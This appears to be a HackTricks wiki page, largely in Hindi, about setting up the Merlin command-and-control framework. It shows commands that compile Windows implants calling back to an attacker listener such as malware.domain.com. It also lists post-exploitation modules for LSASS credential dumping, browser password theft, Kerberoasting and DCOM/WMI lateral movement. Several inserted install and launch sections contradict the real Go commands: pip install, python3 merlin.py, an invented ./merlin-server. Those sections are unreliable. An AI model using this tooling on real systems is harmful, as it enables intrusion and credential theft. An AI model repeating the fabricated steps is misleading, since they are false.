<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में PR जमा करके साझा करें।**

</details>


# स्थापना

## GO स्थापित करें
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## मर्लिन को इंस्टॉल करें

To install Merlin, follow these steps:

1. Download the Merlin repository from the official GitHub page.
2. Extract the downloaded file to a desired location on your machine.
3. Open a terminal and navigate to the extracted folder.
4. Run the command `pip install -r requirements.txt` to install the required dependencies.
5. Once the installation is complete, you can start using Merlin by running the command `python3 merlin.py`.

इन चरणों का पालन करके, मर्लिन को इंस्टॉल करें:

1. आधिकारिक GitHub पेज से मर्लिन रिपॉजिटरी डाउनलोड करें।
2. डाउनलोड की गई फ़ाइल को अपनी मशीन पर एक इच्छित स्थान पर निकालें।
3. एक टर्मिनल खोलें और निकाली गई फ़ोल्डर में जाएं।
4. आवश्यक डिपेंडेंसीज़ को इंस्टॉल करने के लिए निम्नलिखित कमांड को चलाएं: `pip install -r requirements.txt`।
5. स्थापना पूर्ण होने के बाद, आप मर्लिन का उपयोग करना शुरू कर सकते हैं इस कमांड को चलाकर: `python3 merlin.py`।
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# मर्लिन सर्वर लॉन्च करें

To launch the Merlin server, follow these steps:

1. Download the Merlin server package from the official website.
2. Extract the downloaded package to a desired location on your machine.
3. Open a terminal or command prompt and navigate to the extracted directory.
4. Run the following command to start the Merlin server:

   ```bash
   ./merlin-server
   ```

   This will launch the server and it will start listening for incoming connections.

5. By default, the server will listen on port 8080. If you want to use a different port, you can specify it using the `-p` or `--port` option followed by the desired port number. For example:

   ```bash
   ./merlin-server --port 8888
   ```

   This will start the server on port 8888 instead of the default port.

6. Once the server is running, you can access it using a web browser or any other HTTP client by navigating to `http://localhost:8080` (or the specified port if you changed it).

Note: Make sure to configure any necessary firewall rules or network settings to allow incoming connections to the Merlin server.
```
go run cmd/merlinserver/main.go -i
```
# मर्लिन एजेंट्स

आप [पूर्व-संकलित एजेंट डाउनलोड कर सकते हैं](https://github.com/Ne0nd0g/merlin/releases)

## एजेंट्स को कंपाइल करें

मुख्य फ़ोल्डर _$GOPATH/src/github.com/Ne0nd0g/merlin/_ पर जाएं
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **मैनुअल कंपाइल एजेंट्स**

एजेंट्स को मैनुअल रूप से कंपाइल करने के लिए निम्नलिखित चरणों का पालन करें:

1. **भाषा का चयन करें**: एजेंट को कंपाइल करने के लिए उपयुक्त भाषा का चयन करें। यह भाषा आपके लक्ष्यों और उपकरणों के अनुसार भिन्न हो सकती है, जैसे C++, Python, Java आदि।

2. **स्रोत कोड को संशोधित करें**: एजेंट के स्रोत कोड में आवश्यक बदलाव करें, जैसे निर्देशिका संरचना, नाम या अन्य पैरामीटर। यह आपकी आवश्यकताओं और उपयोग के अनुसार भिन्न हो सकता है।

3. **कंपाइल करें**: अपने चयनित भाषा के लिए कंपाइलर का उपयोग करके एजेंट को कंपाइल करें। यह एक बाइनरी फ़ाइल उत्पन्न करेगा जिसे आप बाद में उपयोग कर सकते हैं।

4. **एजेंट को वितरित करें**: कंपाइल किए गए एजेंट को अपने लक्ष्य सिस्टम पर वितरित करें। इसके लिए आप विभिन्न तकनीकों का उपयोग कर सकते हैं, जैसे ईमेल, साझा फ़ोल्डर, यूआरएल आदि।

5. **एजेंट को चलाएं**: वितरित किए गए एजेंट को लक्ष्य सिस्टम पर चलाएं। इसके लिए आपको उपयुक्त तकनीक का उपयोग करना होगा, जैसे दूरस्थ एक्सेस टूल, शेल स्क्रिप्ट, या अन्य उपकरण।

इन चरणों का पालन करके आप मैनुअल रूप से एजेंट्स को कंपाइल कर सकते हैं और उन्हें अपने लक्ष्य सिस्टम पर वितरित और चला सकते हैं।
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# मॉड्यूल

**बुरी खबर यह है कि मर्लिन द्वारा उपयोग किए जाने वाले प्रत्येक मॉड्यूल को स्रोत (Github) से डाउनलोड किया जाता है और उसे उपयोग करने से पहले डिस्क पर सहेजा जाता है। जाने माने मॉड्यूल का उपयोग करते समय सतर्क रहें क्योंकि Windows Defender आपको पकड़ लेगा!**


**SafetyKatz** --> संशोधित Mimikatz। LSASS को फ़ाइल में डंप करें और उस फ़ाइल में sekurlsa::logonpasswords को लॉन्च करें\
**SharpDump** --> निर्दिष्ट प्रक्रिया ID के लिए मिनीडंप (डिफ़ॉल्ट रूप में LSASS) (अंतिम फ़ाइल का एक्सटेंशन .gz है, लेकिन वास्तव में यह .bin है, लेकिन एक .gz फ़ाइल है)\
**SharpRoast** --> Kerberoast (काम नहीं करता है)\
**SeatBelt** --> स्थानीय सुरक्षा परीक्षण CS में (काम नहीं करता है) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> csc.exe /unsafe का उपयोग करके कंपाइल करें\
**Sharp-Up** --> पावरअप में सीशार्प में सभी जांचें (काम करता है)\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS स्पूफ़र और मैन-इन-द-मिडल टूल (काम नहीं करता है, लोड करने की आवश्यकता है: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> उपलब्ध सभी उपयोगकर्ताओं का अभिमान करता है और प्रत्येक के लिए एक चुनौती-प्रतिक्रिया प्राप्त करता है (प्रत्येक उपयोगकर्ता के लिए NTLM हैश) (बुरी URL)\
**Invoke-PowerThIEf** --> IExplorer से फ़ॉर्म चुराएँ या उस प्रक्रिया में JS को निष्पादित करें या उसमें DLL इंजेक्ट करें (काम नहीं करता है) (और PS भी काम नहीं करता है) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> ब्राउज़र पासवर्ड प्राप्त करें (काम करता है, लेकिन आउटपुट निर्देशिका को प्रिंट नहीं करता है)\
**dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> चल रही प्रक्रियाओं में क्लासिक इंजेक्शन का पता लगाएं (क्लासिक इंजेक्शन (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (काम नहीं करता है)\
**Get-OSTokenInformation** --> चल रही प्रक्रियाओं और धागों की टोकन जानकारी प्राप्त करें (उपयोगकर्ता, समूह, विशेषाधिकार, मालिक... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> DCOM के माध्यम से एक कमांड (दूसरे कंप्यूटर में) निष्पादित करें (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> PowerPoint COM ऑब्जेक्ट्स (ADDin) का दुरुपयोग करके ओथे पीसी में एक कमांड निष्पादित करें\
**Invoke-ExcelMacroPivot** --> Excel में DCOM का दुरुपयोग करके ओथे पीसी में एक कमांड निष्पादित करें\
**Find-ComputersWithRemoteAccessPolicies** --> (काम नहीं करता है) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> ग्रुप नीति के सभी रोचक हिस्सों को डंप करता है और उनमें खोज करता है कि उपयोग के लिए कुछ खोजने योग्य है या नहीं। (पुराना हो गया है) Grouper2 पर एक नज़र डालें, बहुत अच्छा दिखता है\
**Invoke-WMILM** --> लैटरली मूवमेंट के लिए WMI\
**Get-GPPPassword** --> groups.xml, scheduledtasks.xml, services.xml और datasources.xml खोजें और प्लेनटेक्स्ट पासवर्ड प्राप्त करें (डोमेन के अंदर)\
**Invoke-Mimikatz** --> mimikatz का उपयोग करें (डिफ़ॉल्ट डंप क्रेडेंशियल्स)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> कंप्यूटरों में उपयोगकर्ताओं की विशेषाधिकारों की जांच करें\
**Find-PotentiallyCrackableAccounts** --> SPN के साथ जुड़े उपयोगकर्ता खातों के बारे में जानकारी प्राप्त करें (Kerberoasting)\
**psgetsystem** --> getsystem

**स्थायित्व मॉड्यूल नहीं जांचे**

# सारांश

मुझे इस उपकरण की भावना और क्षमता बहुत पसंद है।\
मुझे आशा है कि उपकरण सर्वर से मॉड्यूल डाउनलोड करना शुरू करेगा और स्क्रिप्ट डाउनलोड करते समय किसी तरह की टालमटोल शामिल करेगा।


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a
